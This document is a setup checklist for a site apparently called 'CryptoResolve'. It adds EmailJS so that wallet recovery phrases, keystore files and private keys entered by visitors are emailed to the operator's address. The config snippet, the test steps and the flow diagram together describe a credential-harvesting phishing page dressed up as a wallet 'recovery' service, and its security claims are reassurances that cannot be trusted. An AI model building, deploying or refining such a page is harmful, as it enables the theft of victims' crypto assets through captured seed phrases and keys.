<!-- EMAILJS QUICK SETUP CHECKLIST -->

## EmailJS Integration Checklist ✓

### What Changed?
- Added EmailJS library to send recovery data via email
- Updated `index.html` to use EmailJS
- Created `emailjs-config.js` for configuration
- Added data validation before submission

### 4 Quick Steps to Get Started:

**1. Sign Up** (2 min)
   - Go to https://www.emailjs.com
   - Create free account
   - Verify email

**2. Create Email Service** (3 min)
   - Add Gmail service in EmailJS dashboard
   - Authorize access
   - Copy Service ID → save it

**3. Create Email Template** (2 min)
   - Go to Email Templates
   - Create template named: `recovery_request_template`
   - Copy the template ID → save it

**4. Update Config** (2 min)
   - Open `emailjs-config.js`
   - Replace Service ID, Public Key, Template ID
   - Save file → Done!

### Files Changed:
- ✅ `index.html` - Added EmailJS library & updated form submission
- ✅ `emailjs-config.js` - NEW file with EmailJS configuration
- ✅ `EMAILJS_SETUP.md` - Complete setup guide

### Configuration Needed:
In `emailjs-config.js`, replace these values:

```javascript
const EMAILJS_SERVICE_ID = 'YOUR_SERVICE_ID_HERE';
const EMAILJS_PUBLIC_KEY = 'YOUR_PUBLIC_KEY_HERE';
const EMAILJS_TEMPLATE_ID = 'recovery_request_template';
const RECOVERY_EMAIL_RECIPIENT = 'your-email@gmail.com';
```

### Test It:
1. Open the website
2. Click any wallet
3. Enter any 12-24 word phrase
4. Click Submit
5. Check your email → should receive recovery data within 10 seconds

### How It Works:
```
User Input
    ↓
Frontend Validation
    ↓
EmailJS sends email ✉️
    ↓
Backend stores JSON (optional)
    ↓
Success message shown
```

### Supported Recovery Types:
- **Phrase**: 12, 15, 18, 21, or 24 words
- **Keystore**: Valid JSON file content
- **Private Key**: Hex or standard format

### Security:
✓ Client-side validation
✓ HTTPS encryption
✓ Dual delivery (Email + Backend)
✓ Automatic deletion (5 hours)
✓ No third-party storage

### Free Tier:
- 200 emails/month
- All features included
- Upgrade anytime

### Errors & Fixes:

| Error | Fix |
|-------|-----|
| "Configuration incomplete" | Check emailjs-config.js for YOUR_* placeholders |
| Email not received | Check spam folder, verify authorization |
| "Invalid template" | Verify Template ID matches EmailJS dashboard |
| "Service error" | Check Service ID is correct |

### Advanced Features (Optional):

**Rate Limiting**
Add to emailjs-config.js to limit submissions per hour.

**Custom Email Templates**
Edit template in EmailJS dashboard to customize email format.

**Multiple Recipients**
Modify `sendRecoveryViaEmailJS()` to send to multiple emails.

### Need Help?
1. Check EMAILJS_SETUP.md for detailed guide
2. View browser console (F12 → Console tab) for errors
3. Visit https://www.emailjs.com/docs/
4. Review emailjs-config.js comments

### Deployment:
✓ All files ready for production
✓ No additional dependencies needed (except EmailJS library in HTML)
✓ Works with existing PHP backend
✓ CORS-friendly
✓ Mobile responsive

---
**Integration Complete!** Your CryptoResolve recovery system now sends secure emails via EmailJS.
